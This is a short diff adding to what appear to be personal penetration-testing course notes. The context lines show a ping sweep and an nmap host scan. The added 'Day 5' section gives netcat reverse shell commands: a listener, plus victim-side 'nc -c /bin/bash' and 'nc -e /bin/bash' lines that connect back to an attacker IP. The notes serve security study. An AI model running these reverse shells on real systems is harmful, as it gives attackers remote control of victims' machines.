@@ -1033,12 +1033,26 @@ for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
 
 sudo nmap -sP 172.16.82.96/27
 
+-sU scans udp ports need root permissions so use SUDO!!!!!
+
+---------------------------------------------------------------------------------------------------------DAY 5---------------------------------------------------------------------------------------------
 
 
+Reverse shell COMES UP IN SECURITY!!!
+
+First listen for the shell on your device
+
+nc -lvp 9999
 
 
+on victim using -c
+
+nc -c /bin/bash 10.10.0.40 9999
 
 
+on victims using -e
+
+nc -e /bin/bash 10.10.0.40 9999
 
 
 
